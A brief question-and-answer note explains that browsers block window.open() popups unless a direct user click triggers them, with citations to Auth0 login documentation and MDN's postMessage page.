### Why must popup windows be triggered by a direct user click event?

Browsers enforce popup blocker heuristics that automatically block window.open() calls unless initiated by a direct user gesture (like a button click).

## Citations

- https://auth0.com/docs/authenticate/login/auth0-universal-login
- https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
